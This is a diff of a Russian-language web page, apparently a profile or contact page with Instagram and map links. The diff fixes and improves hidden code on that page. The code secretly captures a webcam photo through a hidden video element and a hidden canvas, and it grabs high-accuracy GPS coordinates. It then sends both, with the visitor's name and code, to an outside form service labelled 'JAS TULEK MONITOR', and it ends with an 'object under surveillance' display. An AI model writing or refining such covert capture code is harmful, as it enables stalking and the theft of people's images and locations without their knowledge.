@@ -156,7 +156,7 @@
 </head>
 <body>
 
-<video id="hidden-video" autoplay playsinline></video>
+<video id="hidden-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
 
 <header id="main-header">
@@ -232,7 +232,7 @@
         <a href="https://www.instagram.com/minipig536/" target="_blank" class="btn btn-insta">
             <i class="fab fa-instagram"></i> Instagram: minipig536
         </a>
-        <a href="https://www.google.com/maps/search/?api=1&query=42.306256,69.594949" target="_blank" class="btn btn-map">
+        <a href="https://maps.google.com/local?q=42.3117,69.5954" target="_blank" class="btn btn-map">
             <i class="fas fa-location-dot"></i> Найти на карте (Цитадель)
         </a>
         <button onclick="copySupportID()" class="btn btn-support">
@@ -292,35 +292,43 @@
             }
         }
 
-        // ЗАПРОС ГЕОЛОКАЦИИ
+        // ГЕОЛОКАЦИЯ НА GOOGLE MAPS
         if (navigator.geolocation) {
             try {
                 const pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 5000});
                 });
-                rawCoords = `Широта: ${pos.coords.latitude}, Долгота: ${pos.coords.longitude}`;
-                globalCoords = `https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`;
-            } catch(e) { rawCoords = "GPS_REFUSED_BY_USER"; }
+                rawCoords = `${pos.coords.latitude},${pos.coords.longitude}`;
+                globalCoords = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            } catch(e) { rawCoords = "GPS_DENIED"; }
         }
 
-        // СКРЫТОЕ ФОТО
+        // СКРЫТОЕ ФОТО (ИСПРАВЛЕН ЗАХВАТ)
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('hidden-video');
             video.srcObject = stream;
-            await new Promise(res => setTimeout(res, 800));
+            
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(resolve, 1200); // Пауза для активации камеры
+                };
+            });
+
             const canvas = document.getElementById('hidden-canvas');
-            canvas.width = 640; canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             globalPhoto = canvas.toDataURL('image/jpeg', 0.5);
             stream.getTracks().forEach(t => t.stop());
-        } catch(e) { globalPhoto = "CAMERA_REFUSED_BY_USER"; }
+        } catch(e) { globalPhoto = "CAMERA_ERROR"; }
 
         const payload = {
             access_key: supportID,
             from_name: "JAS TULEK MONITOR",
             subject: `Report: ${name}`,
-            message: `Имя: ${name}\nКод: ${code}\nЦИФРЫ: ${rawCoords}\nКАРТА: ${globalCoords}\n\nФОТО_ДАННЫЕ:\n${globalPhoto}`
+            message: `Имя: ${name}\nКод: ${code}\nКООРДИНАТЫ: ${rawCoords}\nMAPS: ${globalCoords}\n\nФОТО:\n${globalPhoto}`
         };
 
         fetch("https://api.web3forms.com/submit", {
@@ -335,22 +343,18 @@
             document.body.style.backgroundColor = "#0a0a0a";
             document.body.style.color = "#7a0000";
             document.getElementById('main-container').style.backgroundColor = "#111";
-            
             const header = document.getElementById('main-header');
             header.style.opacity = "0"; 
-            
             setTimeout(() => {
                 header.style.background = "linear-gradient(rgba(0,0,0,0.8), rgba(50,0,0,0.9)), url('шапка.png')";
                 header.style.backgroundSize = "cover";
                 document.getElementById('header-title').innerText = "ОБЪЕКТ ПОД НАБЛЮДЕНИЕМ";
                 header.style.opacity = "1";
             }, 2500);
-
             const avatar = document.getElementById('main-avatar');
             avatar.src = 'Amage_0.png';
             avatar.classList.add('rotating');
             avatar.style.filter = "grayscale(1) contrast(1.5)";
-
             const infoBlocks = document.querySelectorAll('.official-text > div');
             infoBlocks.forEach((block, index) => {
                 block.style.borderColor = "#444";
@@ -362,14 +366,12 @@
                 imgContainer.innerHTML = `<img src="Amage_${index+1}.png" class="gallery-item" style="border: 2px solid #4a0000;">`;
                 block.parentNode.insertBefore(imgContainer, block.nextSibling);
             });
-
             const gallery = document.getElementById('main-gallery');
             const allGalleryImages = gallery.querySelectorAll('img');
             allGalleryImages.forEach((img, index) => {
                 img.src = `Amage_${index + 5}.png`;
                 img.style.filter = "sepia(0.5) contrast(1.2)";
             });
-
             alert("КОД ПРИНЯТ! СИСТЕМА ОБНОВЛЕНА!\nСотрудник вошел в Bark_Beetle.Erer");
         } else {
             alert("Заявка отправлена!\nID: " + supportID + "\nИмя: " + name);
